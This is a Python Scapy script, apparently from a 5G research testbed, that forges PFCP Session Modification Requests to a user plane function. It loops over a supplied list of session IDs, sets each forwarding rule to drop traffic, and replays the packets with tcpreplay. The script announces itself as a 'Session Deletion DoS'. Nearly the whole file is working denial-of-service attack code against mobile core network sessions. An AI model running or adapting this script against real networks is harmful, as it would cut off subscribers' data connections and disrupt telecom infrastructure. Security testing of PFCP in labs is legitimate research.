import socket
import sys
from scapy.all import *
from scapy.contrib.pfcp import *
import subprocess
import time
import random
from datetime import datetime
import ast

def write(pkt):
    wrpcap('sess-mod.pcap', pkt, append=True)  #appends packet to output file

IP_src = sys.argv[1] #172.21.0.107 for k3y testbed
IP_dst = sys.argv[2] #172.21.0.110 for k3y testbed
iface = sys.argv[3] #eth0 for k3y testbed
SEID_list = ast.literal_eval(sys.argv[4]) #liste seid

print('Starting Session Deletion DoS with the following parameters:\n')
print()
print('Source IP =', sys.argv[1])
print('Destination IP =', sys.argv[2])
print(f'Selected Interface = {sys.argv[3]}\n')
print(f'Seid list : {SEID_list}')
print("\nTarget SEID is assumed to be equal to 0x1.\n")
input("Press Enter to continue...")
 #we create a session deletion and send it to the UPF
#SEID_list = [0xfbf, 0xfc, 0xfc0, 0xfc1, 0xfc2, 0xfc3, 0xfc4, 0xfc5, 0xfc6, 0xfc7, 0xfc9, 0xfca, 0xfcb, 0xfcc, 0xfce, 0xfcf, 0xfd0, 0xfd1, 0xfd3, 0xfd5, 0xfd6, 0xfd7, 0xfd8, 0xfd9, 0xfda, 0xfdc, 0xfdd, 0xfde, 0xfdf, 0xfe0, 0xfe2, 0xfe3, 0xfe4, 0xfe5, 0xfe7, 0xfe8, 0xfe9, 0xfea, 0xfeb, 0xfee, 0xff, 0xff1, 0xff2, 0xff4, 0xff6, 0xff7, 0xffa, 0xffb, 0xffd, 0xffe]

#SEID_list = [0x545]
now = datetime.now()
debut = now.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
#SEID_cycle = 0xee6
#SEID_list = [0x803]
seq_cycle = 106
for seid in SEID_list:
 #time.sleep(random.randint(0,0.2))
 print(seid)
 msg = 2
 ip_timestamp_option = IPOption_Timestamp(copy_flag=0, optclass='control', option='timestamp', flg=0, timestamp=int(msg))
 packet = Ether()/IP(src=IP_src,dst=IP_dst, options=[ip_timestamp_option])/UDP(sport=8805,dport=8805)/PFCP(version=1, spare_b2=0x0, spare_b3=0x0, spare_b4=0x0, MP=0, S=1, message_type=52, length=52, seid=seid, seq=seq_cycle, spare_oct=0)/PFCPSessionModificationRequest()/IE_UpdateFAR(ietype=10, length=36)/IE_FAR_Id(ietype=108, length=4, id = 1, extra_data='')/IE_ApplyAction(ietype=44, length=1, spare=0, DUPL=0, NOCP=0, BUFF=0, FORW=0, DROP=1, extra_data='')/IE_UpdateForwardingParameters(ietype=11, length=19)/IE_DestinationInterface(ietype=42, length=1, spare=0x0, interface=0, extra_data='')/IE_OuterHeaderCreation(ietype=84, length=10, STAG=0, CTAG=0, IPV6=0, IPV4=0, UDPIPV6=0, UDPIPV4=0, GTPUUDPIPV6=0, GTPUUDPIPV4=1, spare=0, TEID=0x1, ipv4='172.21.0.111')
 print(packet.show())
 packet_converted = bytes(packet) #convert to raw bytes
 write(packet_converted)
 subprocess.run(["tcpreplay", "-i", iface, "sess-mod.pcap"])
 subprocess.run(["rm", "-f", "sess-mod.pcap"])
 #SEID_cycle = SEID_cycle + 1
 seq_cycle = seq_cycle + 1

now = datetime.now()
print("Début à : ",debut)
print("Arrêt à : ",now.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3])
